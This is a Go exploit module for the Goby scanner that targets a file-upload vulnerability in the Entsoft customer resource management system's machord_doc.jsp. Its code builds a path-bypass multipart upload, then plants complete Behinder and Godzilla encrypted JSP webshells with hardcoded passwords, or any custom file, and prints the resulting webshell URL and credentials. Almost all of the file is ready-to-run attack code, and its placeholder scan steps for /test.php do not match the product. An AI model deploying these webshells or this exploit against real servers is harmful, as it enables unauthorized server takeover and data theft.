package exploits

import (
	"encoding/base64"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Entsoft machord_doc.jsp file upload vulnerability",
    "Description": "<p>Zhejiang University Ente customer resource management system is a management system focusing on foreign trade customer resource management and order management products.</p><p>There is a security loophole in Zhejiang University Ente's customer resource management system, and attackers can control the server by bypassing and uploading a malicious Trojan in machord_doc.jsp.</p>",
    "Product": "Zhejiang-Duite-Customer-Resource-MS",
    "Homepage": "http://www.entersoft.cn/",
    "DisclosureDate": "2022-08-29",
    "Author": " abszse",
    "FofaQuery": "body=\"script/Ent.base.js\"",
    "GobyQuery": "body=\"script/Ent.base.js\"",
    "Level": "2",
    "Impact": "<p>There is a security loophole in Zhejiang University Ente's customer resource management system, and attackers can control the server by bypassing and uploading a malicious Trojan in machord_doc.jsp.</p>",
    "Recommendation": "<p>At present, the official security patch has been released, please pay attention to the official website update in time: <a href=\"http://www.entersoft.cn/\">http://www.entersoft.cn/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": ""
        },
        {
            "name": "filename",
            "type": "input",
            "value": "hello.jsp",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(\"hello\");%>",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.5",
    "Translation": {
        "CN": {
            "Name": "浙大恩特客户资源管理系统 machord_doc.jsp 文件上传漏洞",
            "Product": "浙大恩特客户资源管理系统",
            "Description": "<p>浙大恩特客户资源管理系统是一款专注于外贸客户资源管理及订单管理产品的管理系统。<br></p><p>浙大恩特客户资源管理系统存在安全漏洞，攻击者通过绕过并在 machord_doc.jsp 上传恶意的木马从而控制服务器。<br></p>",
            "Recommendation": "<p>目前官方已发布安全补丁，请及时关注官网更新：<a href=\"http://www.entersoft.cn/\">http://www.entersoft.cn/</a><br></p>",
            "Impact": "<p>浙大恩特客户资源管理系统存在安全漏洞，攻击者通过绕过并在 machord_doc.jsp 上传恶意的木马从而控制服务器。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Entsoft machord_doc.jsp file upload vulnerability",
            "Product": "Zhejiang-Duite-Customer-Resource-MS",
            "Description": "<p>Zhejiang University Ente customer resource management system is a management system focusing on foreign trade customer resource management and order management products.<br></p><p>There is a security loophole in Zhejiang University Ente's customer resource management system, and attackers can control the server by bypassing and uploading a malicious Trojan in machord_doc.jsp.<br></p>",
            "Recommendation": "<p>At present, the official security patch has been released, please pay attention to the official website update in time: <a href=\"http://www.entersoft.cn/\">http://www.entersoft.cn/</a><br></p>",
            "Impact": "<p>There is a security loophole in Zhejiang University Ente's customer resource management system, and attackers can control the server by bypassing and uploading a malicious Trojan in machord_doc.jsp.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10875"
}`
	base64EncodeY83fvFG48Rsd := func(input string) string {
		inputBytes := []byte(input)
		encodedString := base64.StdEncoding.EncodeToString(inputBytes)
		return encodedString
	}
	uploadFileY83fvFG48Rsd := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
		uploadConfig := httpclient.NewPostRequestConfig("/entsoft/Storage/machord_doc.jsp;1.jpg?formID=upload&machordernum=&fileName=" + filename + "&strAffixStr=&oprfilenam=null&gesnum=")
		uploadConfig.VerifyTls = false
		uploadConfig.FollowRedirect = false
		uploadConfig.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundarybitMrc8kDHE2Y0eu")
		uploadConfig.Data = "------WebKitFormBoundarybitMrc8kDHE2Y0eu\r\nContent-Disposition: form-data; name=\"oprfilenam\"\r\n\r\nnull\r\n------WebKitFormBoundarybitMrc8kDHE2Y0eu\r\nContent-Disposition: form-data; name=\"uploadflg\"\r\n\r\n0\r\n------WebKitFormBoundarybitMrc8kDHE2Y0eu\r\nContent-Disposition: form-data; name=\"strAffixStr\"\r\n\r\n\r\n------WebKitFormBoundarybitMrc8kDHE2Y0eu\r\nContent-Disposition: form-data; name=\"selfilenam\"\r\n\r\n\r\n------WebKitFormBoundarybitMrc8kDHE2Y0eu\r\nContent-Disposition: form-data; name=\"uploadfile\"; filename=\"" + filename + "\"\r\nContent-Type: application/octet-stream\r\n\r\n" + content + "\r\n------WebKitFormBoundarybitMrc8kDHE2Y0eu--\r\n"
		return httpclient.DoHttpRequest(hostInfo, uploadConfig)
	}
	checkFileY83fvFG48Rsd := func(hostInfo *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		checkConfig := httpclient.NewGetRequestConfig("/enterdoc/Machord/" + filename)
		checkConfig.VerifyTls = false
		checkConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, checkConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			randName := goutils.RandomHexString(6) + ".jsp"
			randStr := goutils.RandomHexString(16)
			content := "<% out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer(\"" + base64EncodeY83fvFG48Rsd(randStr) + "\")));new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>"
			resp, _ := uploadFileY83fvFG48Rsd(hostInfo, randName, content)
			if strings.Contains(resp.Utf8Html, "<title>文件上传</title>") {
				check, _ := checkFileY83fvFG48Rsd(hostInfo, randName)
				return check != nil && check.StatusCode != 404 && strings.Contains(check.Utf8Html, randStr)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var content string
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			filename := goutils.RandomHexString(8) + ".jsp"
			if attackType == "behinder" {
				// /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
				content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
			} else if attackType == "godzilla" {
				// 哥斯拉 hello hello
				content = `<%! String xc="5d41402abc4b2a76"; String pass="hello"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}
%>`
			} else if attackType == "custom" {
				content = goutils.B2S(stepLogs.Params["content"])
				filename = goutils.B2S(stepLogs.Params["filename"])
			} else {
				expResult.Output = `未知的利用方式`
				return expResult
			}
			_, err := uploadFileY83fvFG48Rsd(expResult.HostInfo, filename, content)
			if err != nil {
				expResult.Output = err.Error()
				return expResult
			}
			checkResponse, checkError := checkFileY83fvFG48Rsd(expResult.HostInfo, filename)
			if checkError != nil {
				expResult.Output = err.Error()
				return expResult
			} else if checkResponse != nil && checkResponse.StatusCode != 200 && checkResponse.StatusCode != 500 {
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			expResult.Success = true
			expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/enterdoc/Machord/" + filename + "\n"
			if attackType == "behinder" {
				expResult.Output += "Password: rebeyond\n"
				expResult.Output += "WebShell tool: Behinder v3.0\n"
			} else if attackType == "godzilla" {
				expResult.Output += "Password: hello key: hello 加密器：JAVA_AES_BASE64\n"
				expResult.Output += "WebShell tool: Godzilla v4.1\n"
			}
			expResult.Output += "Webshell type: jsp"
			return expResult
		},
	))
}
